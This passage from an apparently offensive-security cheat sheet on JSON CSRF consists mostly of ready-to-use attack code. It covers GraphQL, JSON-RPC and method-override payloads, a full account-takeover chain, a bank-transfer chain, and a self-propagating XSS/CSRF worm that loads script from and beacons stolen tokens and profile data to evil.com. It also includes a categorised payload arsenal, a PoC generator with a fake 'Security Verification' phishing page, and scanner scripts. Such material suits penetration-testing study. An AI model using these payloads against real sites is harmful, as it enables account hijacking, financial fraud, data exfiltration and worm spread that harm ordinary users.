    var img = new Image();
    img.src = 'https://target.com/graphql?query=' + encodeURIComponent(m);
  });
  </script>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Mutation with Variables"}
  ```html
  <!-- GraphQL with variables via fetch -->
  <script>
  fetch('https://target.com/graphql', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({
      query: `mutation UpdateProfile($input: UpdateProfileInput!) {
        updateProfile(input: $input) {
          id
          email
          role
        }
      }`,
      variables: {
        input: {
          email: 'attacker@evil.com',
          role: 'ADMIN'
        }
      }
    })
  });
  </script>

  <!-- GraphQL via application/x-www-form-urlencoded -->
  <form action="https://target.com/graphql" method="POST">
    <input name="query" value='mutation{updateEmail(email:"attacker@evil.com"){ok}}' type="hidden">
  </form>
  <script>document.forms[0].submit();</script>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="GraphQL Introspection + CSRF"}
  ```bash
  # Step 1: Introspect schema to find mutations
  curl -s https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"}' | \
    jq '.data.__schema.mutationType.fields[] | {name, args: [.args[].name]}'

  # Step 2: Identify state-changing mutations
  # Look for: updateUser, changePassword, deleteAccount,
  # createToken, transferFunds, updateRole, etc.

  # Step 3: Test mutation via text/plain (CSRF feasible?)
  curl -X POST https://target.com/graphql \
    -H "Content-Type: text/plain" \
    -H "Cookie: session=VALID" \
    -d '{"query":"mutation{updateUser(email:\"test@test.com\"){id}}"}'

  # Step 4: Test mutation via GET
  curl "https://target.com/graphql?query=mutation{updateUser(email:\"test@test.com\"){id}}" \
    -H "Cookie: session=VALID"

  # Step 5: Batch mutations in single request
  curl -X POST https://target.com/graphql \
    -H "Content-Type: text/plain" \
    -H "Cookie: session=VALID" \
    -d '[{"query":"mutation{updateEmail(email:\"evil@evil.com\"){ok}}"},{"query":"mutation{createToken(name:\"x\"){key}}"}]'
  ```
  :::
::

### JSON-RPC CSRF

::code-group
```html [Single JSON-RPC Call]
<!-- JSON-RPC 2.0 CSRF via text/plain form -->
<html>
<head><meta name="referrer" content="no-referrer"></head>
<body>
<form action="https://target.com/jsonrpc" method="POST" enctype="text/plain">
  <input type="hidden"
    name='{"jsonrpc":"2.0","method":"user.updateEmail","params":{"email":"attacker@evil.com"},"id":1,"p":"'
    value='"}' />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

```html [Batch JSON-RPC Attack]
<!-- Execute multiple RPC calls in single request -->
<html>
<body>
<script>
fetch('https://target.com/jsonrpc', {
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',
  headers: { 'Content-Type': 'text/plain' },
  body: JSON.stringify([
    { jsonrpc: '2.0', method: 'user.updateEmail', params: { email: 'attacker@evil.com' }, id: 1 },
    { jsonrpc: '2.0', method: 'user.disable2FA', params: {}, id: 2 },
    { jsonrpc: '2.0', method: 'user.createApiKey', params: { scope: 'admin' }, id: 3 },
    { jsonrpc: '2.0', method: 'user.changePassword', params: { new_password: 'Pwned!' }, id: 4 },
    { jsonrpc: '2.0', method: 'admin.addUser', params: { username: 'backdoor', role: 'admin' }, id: 5 }
  ])
});
</script>
</body>
</html>
```

```bash [JSON-RPC Method Enumeration]
# Enumerate available JSON-RPC methods
methods=(
  "system.listMethods"
  "system.methodHelp"
  "user.update"
  "user.delete"
  "user.changePassword"
  "user.updateEmail"
  "user.setRole"
  "admin.createUser"
  "admin.deleteUser"
  "account.transfer"
  "settings.update"
)

for method in "${methods[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/jsonrpc" \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"$method\",\"params\":{},\"id\":1}")
  echo "Method: $method → $status"
done
```
::

### REST API Method Override CSRF

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Query Parameter Override"}
  ```bash
  # Test various method override parameter names via GET/POST
  OVERRIDES=(
    "_method"
    "method"
    "_METHOD"
    "X-HTTP-Method"
    "X-HTTP-Method-Override"
    "X-Method-Override"
    "_HttpMethod"
    "httpMethod"
  )

  for param in "${OVERRIDES[@]}"; do
    for method in "PUT" "PATCH" "DELETE"; do
      status=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "https://target.com/api/user/1?${param}=${method}" \
        -H "Content-Type: text/plain" \
        -H "Cookie: session=VICTIM" \
        -d '{"role":"admin"}')
      echo "${param}=${method} → $status"
    done
  done

  # Test method override in JSON body
  for method in "PUT" "PATCH" "DELETE"; do
    curl -X POST "https://target.com/api/user/1" \
      -H "Content-Type: text/plain" \
      -H "Cookie: session=VICTIM" \
      -d "{\"_method\":\"$method\",\"role\":\"admin\"}" \
      -s -o /dev/null -w "Body _method=$method → %{http_code}\n"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Method Override HTML Exploits"}
  ```html
  <!-- PUT via _method parameter (Rails, Laravel, etc.) -->
  <form action="https://target.com/api/users/1?_method=PUT" method="POST" enctype="text/plain">
    <input name='{"role":"admin","email":"attacker@evil.com","p":"' value='"}' type="hidden">
  </form>
  <script>document.forms[0].submit();</script>

  <!-- DELETE via method override (account deletion) -->
  <form action="https://target.com/api/users/victim_id?_method=DELETE" method="POST" enctype="text/plain">
    <input name='{"confirm":true,"p":"' value='"}' type="hidden">
  </form>
  <script>document.forms[0].submit();</script>

  <!-- PATCH via X-HTTP-Method-Override in body -->
  <form action="https://target.com/api/settings" method="POST" enctype="text/plain">
    <input name='{"_method":"PATCH","notifications":false,"security_alerts":false,"p":"' value='"}' type="hidden">
  </form>
  <script>document.forms[0].submit();</script>
  ```
  :::
::

## Multi-Action Chained Exploitation

### Sequential Attack Chains

::tabs
  :::tabs-item{icon="i-lucide-code" label="Full Account Takeover Chain"}
  ```html
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <script>
  async function fullAccountTakeover() {
    const base = 'https://target.com/api';
    const opts = {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: { 'Content-Type': 'text/plain' }
    };

    // Stage 1: Change email to attacker-controlled
    await fetch(`${base}/user/email`, {
      ...opts,
      body: '{"email":"attacker@evil.com"}'
    });
    await sleep(500);

    // Stage 2: Disable two-factor authentication
    await fetch(`${base}/user/2fa/disable`, {
      ...opts,
      body: '{"confirm":true}'
    });
    await sleep(500);

    // Stage 3: Disable security notifications
    await fetch(`${base}/settings/notifications`, {
      ...opts,
      body: '{"security_alerts":false,"login_alerts":false}'
    });
    await sleep(500);

    // Stage 4: Create persistent API token
    await fetch(`${base}/tokens`, {
      ...opts,
      body: '{"name":"analytics-service","scope":"admin:all","expires":null}'
    });
    await sleep(500);

    // Stage 5: Add SSH key for repository access
    await fetch(`${base}/user/keys`, {
      ...opts,
      body: '{"title":"workstation","key":"ssh-rsa AAAAB3...attacker_pubkey"}'
    });
    await sleep(500);

    // Stage 6: Add webhook for data exfiltration
    await fetch(`${base}/webhooks`, {
      ...opts,
      body: '{"url":"https://evil.com/exfil","events":["*"],"active":true}'
    });
    await sleep(500);

    // Stage 7: Add OAuth application for persistent access
    await fetch(`${base}/oauth/applications`, {
      ...opts,
      body: '{"name":"Integation Service","redirect_uri":"https://evil.com/oauth/callback","scopes":"read write admin"}'
    });
    await sleep(500);

    // Stage 8: Change password (final lockout)
    await fetch(`${base}/user/password`, {
      ...opts,
      body: '{"new_password":"ATO-Pwned-2024!","confirm":"ATO-Pwned-2024!"}'
    });

    // Redirect victim to legitimate page
    setTimeout(() => {
      window.location.href = 'https://target.com/dashboard';
    }, 1000);
  }

  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  fullAccountTakeover();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Multi-iframe Parallel Attack"}
  ```html
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <!-- Each iframe targets a different endpoint simultaneously -->

  <iframe name="f1" style="display:none"></iframe>
  <iframe name="f2" style="display:none"></iframe>
  <iframe name="f3" style="display:none"></iframe>
  <iframe name="f4" style="display:none"></iframe>
  <iframe name="f5" style="display:none"></iframe>

  <form id="a1" action="https://target.com/api/user/email" method="POST" 
        enctype="text/plain" target="f1">
    <input name='{"email":"attacker@evil.com","p":"' value='"}' type="hidden">
  </form>

  <form id="a2" action="https://target.com/api/user/role" method="POST" 
        enctype="text/plain" target="f2">
    <input name='{"role":"admin","p":"' value='"}' type="hidden">
  </form>

  <form id="a3" action="https://target.com/api/tokens" method="POST" 
        enctype="text/plain" target="f3">
    <input name='{"name":"svc","scope":"admin","p":"' value='"}' type="hidden">
  </form>

  <form id="a4" action="https://target.com/api/webhooks" method="POST" 
        enctype="text/plain" target="f4">
    <input name='{"url":"https://evil.com/hook","events":["*"],"p":"' value='"}' type="hidden">
  </form>

  <form id="a5" action="https://target.com/api/user/2fa/disable" method="POST" 
        enctype="text/plain" target="f5">
    <input name='{"confirm":true,"p":"' value='"}' type="hidden">
  </form>

  <script>
  // Staggered submission to avoid rate limiting
  ['a1','a2','a3','a4','a5'].forEach((id, i) => {
    setTimeout(() => document.getElementById(id).submit(), i * 300);
  });
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Financial Transfer Chain"}
  ```html
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <script>
  async function financialCSRF() {
    const send = (url, data) => fetch(url, {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: { 'Content-Type': 'text/plain' },
      body: JSON.stringify(data)
    });

    // Step 1: Add attacker's bank account as beneficiary
    await send('https://target.com/api/beneficiaries', {
      name: 'Savings Account',
      account_number: 'ATTACKER_ACCT_001',
      routing_number: '110000000',
      type: 'checking'
    });

    // Step 2: Increase transfer limits
    await send('https://target.com/api/settings/transfer-limits', {
      daily_limit: 999999,
      per_transaction_limit: 999999
    });

    // Step 3: Initiate transfer
    await send('https://target.com/api/transfers', {
      to_beneficiary: 'ATTACKER_ACCT_001',
      amount: 50000,
      currency: 'USD',
      memo: 'Invoice Payment #38291'
    });

    // Step 4: Disable transaction notifications
    await send('https://target.com/api/notifications', {
      transaction_alerts: false,
      email_notifications: false,
      sms_notifications: false
    });
  }

  financialCSRF();
  </script>
  </body>
  </html>
  ```
  :::
::

### CSRF + XSS Chaining

::tabs
  :::tabs-item{icon="i-lucide-code" label="XSS → JSON CSRF with Token Extraction"}
  ```javascript
  // When XSS exists on target.com, CSRF becomes trivial
  // XSS runs same-origin → bypasses ALL CSRF protections

  // Compact XSS payload for JSON CSRF with token extraction
  (async () => {
    // Step 1: Extract CSRF token from page or API
    const tokenResp = await fetch('/api/csrf-token');
    const { token } = await tokenResp.json();

    // Step 2: Perform authenticated JSON request with valid token
    const result = await fetch('/api/user/email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': token
      },
      credentials: 'same-origin',
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });

    // Step 3: Exfiltrate response
    const data = await result.json();
    navigator.sendBeacon('https://evil.com/exfil', JSON.stringify(data));

    // Step 4: Additional actions with same token
    await fetch('/api/user/password', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': token
      },
      body: JSON.stringify({ new_password: 'XSS-CSRF-Pwned!' })
    });
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Self-Propagating CSRF Worm"}
  ```javascript
  // Stored XSS + CSRF worm that spreads to every user who views the page
  (async function worm() {
    // Propagation payload
    const wormCode = `<script src="https://evil.com/worm.js"><\/script>`;
    
    // Step 1: Get CSRF token
    const t = await (await fetch('/api/csrf')).json();
    const csrf = t.token;
    const headers = {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrf
    };

    // Step 2: Takeover current user
    await fetch('/api/user/email', {
      method: 'POST', headers,
      body: JSON.stringify({ email: 'worm+' + Date.now() + '@evil.com' })
    });

    // Step 3: Create API token for persistent access
    const tokenResp = await fetch('/api/tokens', {
      method: 'POST', headers,
      body: JSON.stringify({ name: 'sys', scope: 'admin' })
    });
    const tokenData = await tokenResp.json();
    navigator.sendBeacon('https://evil.com/tokens', JSON.stringify(tokenData));

    // Step 4: Extract sensitive data
    const userData = await (await fetch('/api/user/profile')).json();
    navigator.sendBeacon('https://evil.com/profiles', JSON.stringify(userData));

    // Step 5: Self-propagate via profile bio/comments/posts
    const endpoints = [
      { url: '/api/user/bio', field: 'bio' },
      { url: '/api/posts', field: 'content' },
      { url: '/api/comments', field: 'body' },
    ];
    
    for (const ep of endpoints) {
      await fetch(ep.url, {
        method: 'POST', headers,
        body: JSON.stringify({ [ep.field]: wormCode })
      }).catch(() => {});
    }
  })();
  ```
  :::
::

## Payload Collection by Target Action

::collapsible

::field-group
  ::field{name="Account Takeover" type="critical"}
  Email change, password reset, recovery phone modification, SSH key injection, OAuth app creation — full identity hijack payloads.
  ::

  ::field{name="Privilege Escalation" type="critical"}
  Role modification, group membership changes, permission grants, admin flag toggles, scope elevation via API tokens.
  ::

  ::field{name="Financial Operations" type="critical"}
  Fund transfers, beneficiary additions, billing modifications, subscription changes, payment method updates.
  ::

  ::field{name="Data Exfiltration Setup" type="high"}
  Webhook injection, email forwarding rules, API token creation, OAuth application registration for persistent data access.
  ::

  ::field{name="Denial of Service" type="high"}
  Account deletion, session invalidation, 2FA lockout, data wipe, configuration destruction.
  ::

  ::field{name="Persistence Mechanisms" type="high"}
  Backdoor user creation, API key generation, OAuth app registration, SSH key injection, webhook callbacks.
  ::



::code-collapse
```html
<!-- ================================================================ -->
<!-- COMPLETE PAYLOAD ARSENAL: JSON CSRF Templates by Category        -->
<!-- ================================================================ -->

<!-- ============== ACCOUNT TAKEOVER ============== -->

<!-- Change Email Address -->
<form action="https://TARGET/api/v1/account/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","confirm_email":"attacker@evil.com","p":"' value='"}' type="hidden">
</form>

<!-- Change Password (no current password required) -->
<form action="https://TARGET/api/v1/account/password" method="POST" enctype="text/plain">
  <input name='{"new_password":"Hacked!2024","confirm_password":"Hacked!2024","p":"' value='"}' type="hidden">
</form>

<!-- Add Recovery Email -->
<form action="https://TARGET/api/v1/account/recovery" method="POST" enctype="text/plain">
  <input name='{"recovery_email":"attacker@evil.com","p":"' value='"}' type="hidden">
</form>

<!-- Change Phone Number -->
<form action="https://TARGET/api/v1/account/phone" method="POST" enctype="text/plain">
  <input name='{"phone":"+1555attacker","p":"' value='"}' type="hidden">
</form>

<!-- Add SSH Key -->
<form action="https://TARGET/api/v1/user/keys" method="POST" enctype="text/plain">
  <input name='{"title":"laptop","key":"ssh-rsa AAAAB3NzaC1...ATTACKER_KEY","p":"' value='"}' type="hidden">
</form>

<!-- Add OAuth Application -->
<form action="https://TARGET/api/v1/oauth/applications" method="POST" enctype="text/plain">
  <input name='{"name":"Integration","redirect_uri":"https://evil.com/cb","scopes":"read write admin","p":"' value='"}' type="hidden">
</form>

<!-- Add Passkey/WebAuthn (if supported) -->
<form action="https://TARGET/api/v1/webauthn/register" method="POST" enctype="text/plain">
  <input name='{"name":"backup-key","attestation":"none","p":"' value='"}' type="hidden">
</form>

<!-- ============== PRIVILEGE ESCALATION ============== -->

<!-- Direct Role Change -->
<form action="https://TARGET/api/v1/users/me/role" method="POST" enctype="text/plain">
  <input name='{"role":"administrator","p":"' value='"}' type="hidden">
</form>

<!-- Add to Admin Group -->
<form action="https://TARGET/api/v1/groups/admins/members" method="POST" enctype="text/plain">
  <input name='{"user_id":"ATTACKER_USER_ID","access_level":"owner","p":"' value='"}' type="hidden">
</form>

<!-- Permission Grant -->
<form action="https://TARGET/api/v1/permissions" method="POST" enctype="text/plain">
  <input name='{"user_id":"ATTACKER_ID","permissions":["admin","write","delete","manage_users"],"p":"' value='"}' type="hidden">
</form>

<!-- Feature Flag Toggle -->
<form action="https://TARGET/api/v1/features" method="POST" enctype="text/plain">
  <input name='{"feature":"admin_panel","enabled":true,"p":"' value='"}' type="hidden">
</form>

<!-- ============== FINANCIAL ============== -->

<!-- Add Beneficiary -->
<form action="https://TARGET/api/v1/beneficiaries" method="POST" enctype="text/plain">
  <input name='{"name":"Savings","account":"ATTACKER_IBAN","bank_code":"SWIFT","p":"' value='"}' type="hidden">
</form>

<!-- Initiate Transfer -->
<form action="https://TARGET/api/v1/transfers" method="POST" enctype="text/plain">
  <input name='{"to":"ATTACKER_ACCT","amount":50000,"currency":"USD","memo":"Invoice","p":"' value='"}' type="hidden">
</form>

<!-- Change Billing Address -->
<form action="https://TARGET/api/v1/billing/address" method="POST" enctype="text/plain">
  <input name='{"street":"123 Attacker St","city":"EvilCity","country":"US","p":"' value='"}' type="hidden">
</form>

<!-- Update Payment Method -->
<form action="https://TARGET/api/v1/billing/payment" method="POST" enctype="text/plain">
  <input name='{"type":"bank_transfer","routing":"110000000","account":"9876543210","p":"' value='"}' type="hidden">
</form>

<!-- ============== DATA EXFILTRATION SETUP ============== -->

<!-- Add Webhook -->
<form action="https://TARGET/api/v1/webhooks" method="POST" enctype="text/plain">
  <input name='{"url":"https://evil.com/exfil","events":["*"],"secret":"","active":true,"p":"' value='"}' type="hidden">
</form>

<!-- Email Forwarding Rule -->
<form action="https://TARGET/api/v1/email/forwarding" method="POST" enctype="text/plain">
  <input name='{"forward_to":"attacker@evil.com","keep_copy":false,"filter":"all","p":"' value='"}' type="hidden">
</form>

<!-- Create API Token -->
<form action="https://TARGET/api/v1/tokens" method="POST" enctype="text/plain">
  <input name='{"name":"monitoring-svc","scopes":["admin:all","read:all","write:all"],"expires_at":null,"p":"' value='"}' type="hidden">
</form>

<!-- Data Export Request -->
<form action="https://TARGET/api/v1/export" method="POST" enctype="text/plain">
  <input name='{"format":"csv","data":["users","transactions","messages"],"send_to":"attacker@evil.com","p":"' value='"}' type="hidden">
</form>

<!-- ============== PERSISTENCE ============== -->

<!-- Create Backdoor User -->
<form action="https://TARGET/api/v1/admin/users" method="POST" enctype="text/plain">
  <input name='{"username":"svc-monitor","email":"backdoor@evil.com","password":"B4ckd00r!","role":"admin","p":"' value='"}' type="hidden">
</form>

<!-- Invite Attacker User -->
<form action="https://TARGET/api/v1/invitations" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","role":"admin","teams":["*"],"p":"' value='"}' type="hidden">
</form>

<!-- ============== DENIAL OF SERVICE ============== -->

<!-- Delete Account -->
<form action="https://TARGET/api/v1/account/delete" method="POST" enctype="text/plain">
  <input name='{"confirm":true,"reason":"csrf","p":"' value='"}' type="hidden">
</form>

<!-- Disable 2FA -->
<form action="https://TARGET/api/v1/account/2fa/disable" method="POST" enctype="text/plain">
  <input name='{"confirm":true,"p":"' value='"}' type="hidden">
</form>

<!-- Revoke All Sessions -->
<form action="https://TARGET/api/v1/sessions/revoke-all" method="POST" enctype="text/plain">
  <input name='{"confirm":true,"p":"' value='"}' type="hidden">
</form>

<!-- Wipe Data -->
<form action="https://TARGET/api/v1/data/purge" method="POST" enctype="text/plain">
  <input name='{"scope":"all","confirm":"PURGE","p":"' value='"}' type="hidden">
</form>

<!-- ============== CONFIGURATION ABUSE ============== -->

<!-- Change Notification Settings (cover tracks) -->
<form action="https://TARGET/api/v1/settings/notifications" method="POST" enctype="text/plain">
  <input name='{"email_notifications":false,"security_alerts":false,"login_alerts":false,"p":"' value='"}' type="hidden">
</form>

<!-- Change Application Settings -->
<form action="https://TARGET/api/v1/settings/application" method="POST" enctype="text/plain">
  <input name='{"public_profile":true,"allow_indexing":true,"third_party_access":true,"p":"' value='"}' type="hidden">
</form>

<!-- Modify CORS/Security Headers (if configurable) -->
<form action="https://TARGET/api/v1/settings/security" method="POST" enctype="text/plain">
  <input name='{"cors_origins":["*"],"csp_policy":"","p":"' value='"}' type="hidden">
</form>
```
::

## Automation & Custom Tooling

### PoC Generator

::code-tree{default-value="csrf_json_generator.py"}
```python [csrf_json_generator.py]
#!/usr/bin/env python3
"""
JSON CSRF PoC Generator - Generates multiple exploit techniques
Usage: python3 csrf_json_generator.py -u URL -d JSON_DATA [-t TECHNIQUE] [-o OUTPUT]
"""

import json, sys, argparse, html, base64
from urllib.parse import quote

class CSRFGenerator:
    def __init__(self, url, data, output_prefix='csrf'):
        self.url = url
        self.data = data
        self.prefix = output_prefix
    
    def form_textplain(self):
        """HTML form with enctype=text/plain"""
        j = json.dumps(self.data, separators=(',',':'))
        name_part = j[:-1] + ',"_p":"'
        return f'''<!DOCTYPE html>
<html>
<head><meta name="referrer" content="no-referrer"></head>
<body>
<form action="{html.escape(self.url)}" method="POST" enctype="text/plain">
  <input type="hidden" name='{html.escape(name_part)}' value='"}}' />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>'''

    def fetch_nocors(self):
        """fetch() with mode: no-cors"""
        return f'''<!DOCTYPE html>
<html>
<head><meta name="referrer" content="no-referrer"></head>
<body>
<script>
fetch('{self.url}', {{
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',
  headers: {{ 'Content-Type': 'text/plain' }},
  body: {json.dumps(json.dumps(self.data))}
}});
</script>
</body>
</html>'''

    def beacon(self):
        """navigator.sendBeacon()"""
        return f'''<!DOCTYPE html>
<html>
<head><meta name="referrer" content="no-referrer"></head>
<body>
<script>
navigator.sendBeacon(
  '{self.url}',
  new Blob([{json.dumps(json.dumps(self.data))}], {{type:'text/plain'}})
);
</script>
</body>
</html>'''

    def xhr(self):
        """XMLHttpRequest"""
        return f'''<!DOCTYPE html>
<html>
<head><meta name="referrer" content="no-referrer"></head>
<body>
<script>
var x = new XMLHttpRequest();
x.open('POST', '{self.url}', true);
x.setRequestHeader('Content-Type', 'text/plain');
x.withCredentials = true;
x.send({json.dumps(json.dumps(self.data))});
</script>
</body>
</html>'''

    def sandbox_iframe(self):
        """Sandboxed iframe for null Origin"""
        j = json.dumps(self.data, separators=(',',':'))
        name_part = j[:-1] + ',&quot;_p&quot;:&quot;'
        return f'''<!DOCTYPE html>
<html>
<body>
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<form action='{html.escape(self.url)}' method='POST' enctype='text/plain'>
  <input name='{name_part}' value='&quot;}}' type='hidden'>
</form>
<script>document.forms[0].submit();</script>
"></iframe>
</body>
</html>'''

    def data_uri(self):
        """data: URI for null Origin"""
        inner = f'''<html><body><script>
fetch('{self.url}', {{
  method: 'POST', mode: 'no-cors', credentials: 'include',
  headers: {{'Content-Type':'text/plain'}},
  body: '{json.dumps(self.data)}'
}});
</script></body></html>'''
        b64 = base64.b64encode(inner.encode()).decode()
        return f'''<!DOCTYPE html>
<html>
<body>
<iframe src="data:text/html;base64,{b64}"></iframe>
</body>
</html>'''

    def urlencoded(self):
        """URL-encoded form with JSON body"""
        return f'''<!DOCTYPE html>
<html>
<head><meta name="referrer" content="no-referrer"></head>
<body>
<form action="{html.escape(self.url)}" method="POST">
  <input type="hidden" name='{html.escape(json.dumps(self.data))}' value="" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>'''

    def multipart(self):
        """Multipart form data"""
        return f'''<!DOCTYPE html>
<html>
<head><meta name="referrer" content="no-referrer"></head>
<body>
<form action="{html.escape(self.url)}" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="data" value='{html.escape(json.dumps(self.data))}' />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>'''

    def stealth_page(self):
        """Social engineering page with hidden CSRF"""
        j = json.dumps(self.data, separators=(',',':'))
        name_part = j[:-1] + ',"_p":"'
        return f'''<!DOCTYPE html>
<html>
<head>
  <meta name="referrer" content="no-referrer">
  <title>Security Verification Required</title>
  <style>
    body {{ font-family: -apple-system, sans-serif; max-width: 500px; margin: 80px auto; }}
    .card {{ background: #f8f9fa; border: 1px solid #dee2e6; padding: 30px; border-radius: 8px; text-align: center; }}
    .btn {{ background: #0d6efd; color: #fff; padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; }}
    .btn:hover {{ background: #0b5ed7; }}
    .spinner {{ display: none; margin: 20px auto; }}
  </style>
</head>
<body>
<div class="card">
  <h2>⚠️ Security Verification</h2>
  <p>Your session requires re-verification. Click below to continue.</p>
  <button class="btn" onclick="fire()">Verify Identity</button>
  <div class="spinner" id="sp">Verifying... please wait.</div>
</div>
<iframe name="sink" style="display:none"></iframe>
<form id="f" action="{html.escape(self.url)}" method="POST" enctype="text/plain" target="sink" style="display:none">
  <input name='{html.escape(name_part)}' value='"}}' type="hidden">
</form>
<script>
function fire() {{
  document.getElementById('sp').style.display='block';
  document.getElementById('f').submit();
  setTimeout(()=>window.location='https://target.com/',2000);
}}
</script>
</body>
</html>'''

    def generate_all(self):
        techniques = {
            'form_textplain': self.form_textplain,
            'fetch_nocors': self.fetch_nocors,
            'beacon': self.beacon,
            'xhr': self.xhr,
            'sandbox_iframe': self.sandbox_iframe,
            'data_uri': self.data_uri,
            'urlencoded': self.urlencoded,
            'multipart': self.multipart,
            'stealth': self.stealth_page,
        }
        for name, func in techniques.items():
            filename = f"{self.prefix}_{name}.html"
            with open(filename, 'w') as f:
                f.write(func())
            print(f"[+] {filename}")

if __name__ == '__main__':
    p = argparse.ArgumentParser(description='JSON CSRF PoC Generator')
    p.add_argument('-u', '--url', required=True)
    p.add_argument('-d', '--data', required=True, help='JSON payload')
    p.add_argument('-t', '--technique', default='all',
                   choices=['form_textplain','fetch_nocors','beacon','xhr',
                           'sandbox_iframe','data_uri','urlencoded',
                           'multipart','stealth','all'])
    p.add_argument('-o', '--output', default='csrf')
    args = p.parse_args()
    
    gen = CSRFGenerator(args.url, json.loads(args.data), args.output)
    if args.technique == 'all':
        gen.generate_all()
    else:
        poc = getattr(gen, args.technique)()
        fn = f"{args.output}_{args.technique}.html"
        with open(fn, 'w') as f:
            f.write(poc)
        print(f"[+] {fn}")
```

```bash [usage.sh]
# Generate all PoC types for email change
python3 csrf_json_generator.py \
  -u "https://target.com/api/user/email" \
  -d '{"email":"attacker@evil.com"}' \
  -t all -o email_csrf

# Generate stealth social engineering page
python3 csrf_json_generator.py \
  -u "https://target.com/api/user/password" \
  -d '{"new_password":"Hacked!","confirm":"Hacked!"}' \
  -t stealth -o password_csrf

# Generate null-origin sandbox iframe
python3 csrf_json_generator.py \
  -u "https://target.com/api/transfer" \
  -d '{"to":"ATTACKER","amount":10000}' \
  -t sandbox_iframe -o transfer_csrf

# Generate beacon-based fire-and-forget
python3 csrf_json_generator.py \
  -u "https://target.com/api/tokens" \
  -d '{"name":"backdoor","scope":"admin"}' \
  -t beacon -o token_csrf
```
::

### Automated Vulnerability Scanner

::code-group
```bash [csrf_json_scanner.sh]
#!/bin/bash
# Comprehensive JSON CSRF vulnerability scanner
# Usage: ./csrf_json_scanner.sh <base_url> <session_cookie> [endpoints_file]

BASE="${1:?Usage: $0 <base_url> <cookie> [endpoints_file]}"
COOKIE="${2:?Provide session cookie}"
ENDPOINTS_FILE="${3:-}"
REPORT="csrf_scan_$(date +%Y%m%d_%H%M%S).txt"

# Default endpoints if no file provided
DEFAULT_ENDPOINTS=(
  "/api/user/email" "/api/user/password" "/api/user/profile"
  "/api/user/role" "/api/user/settings" "/api/user/2fa"
  "/api/account/update" "/api/account/delete" "/api/settings"
  "/api/tokens" "/api/webhooks" "/api/transfer"
  "/api/admin/users" "/api/admin/settings"
  "/api/v1/users/me" "/api/v2/profile"
  "/graphql" "/jsonrpc"
)

if [ -n "$ENDPOINTS_FILE" ]; then
  mapfile -t ENDPOINTS < "$ENDPOINTS_FILE"
else
  ENDPOINTS=("${DEFAULT_ENDPOINTS[@]}")
fi

CONTENT_TYPES=(
  "application/json"
  "text/plain"
  "application/x-www-form-urlencoded"
  "multipart/form-data"
  "text/html"
  "text/xml"
)

ORIGINS=(
  ""
  "https://evil.com"
  "null"
  "${BASE}.evil.com"
)

echo "=========================================" | tee "$REPORT"
echo "JSON CSRF Vulnerability Scanner" | tee -a "$REPORT"
echo "Target: $BASE" | tee -a "$REPORT"
echo "Date: $(date)" | tee -a "$REPORT"
echo "=========================================" | tee -a "$REPORT"

vuln_count=0

for endpoint in "${ENDPOINTS[@]}"; do
  url="${BASE}${endpoint}"
  echo -e "\n[*] Testing: $endpoint" | tee -a "$REPORT"
  
  for ct in "${CONTENT_TYPES[@]}"; do
    for origin in "${ORIGINS[@]}"; do
      origin_header=""
      origin_label="same-origin"
      if [ -n "$origin" ]; then
        origin_header="-H \"Origin: $origin\""
        origin_label="$origin"
      fi

      status=$(eval curl -s -o /dev/null -w '%{http_code}' \
        -X POST "'$url'" \
        -H "'Content-Type: $ct'" \
        $origin_header \
        -H "'Cookie: $COOKIE'" \
        -d "'{"test":"csrf_probe"}'" \
        --max-time 10 2>/dev/null)
      
      if [[ "$status" =~ ^(200|201|204|302)$ ]]; then
        echo "  [!] VULNERABLE: CT=$ct | Origin=$origin_label | Status=$status" | tee -a "$REPORT"
        ((vuln_count++))
      fi
    done
  done
done

echo -e "\n=========================================" | tee -a "$REPORT"
echo "[*] Scan complete. $vuln_count potential vulnerabilities found." | tee -a "$REPORT"
echo "[*] Report saved: $REPORT" | tee -a "$REPORT"
```

```python [csrf_bulk_analyzer.py]
#!/usr/bin/env python3
"""
Bulk JSON CSRF Vulnerability Analyzer
Tests multiple endpoints with various bypass techniques
Generates detailed report and PoC files
"""

import requests, json, sys, os, concurrent.futures
from datetime import datetime
from urllib.parse import urljoin

class CSRFAnalyzer:
    def __init__(self, base_url, cookies, output_dir='csrf_results'):
        self.base = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.cookies.update(cookies)
        self.session.verify = False
        self.output_dir = output_dir
        self.findings = []
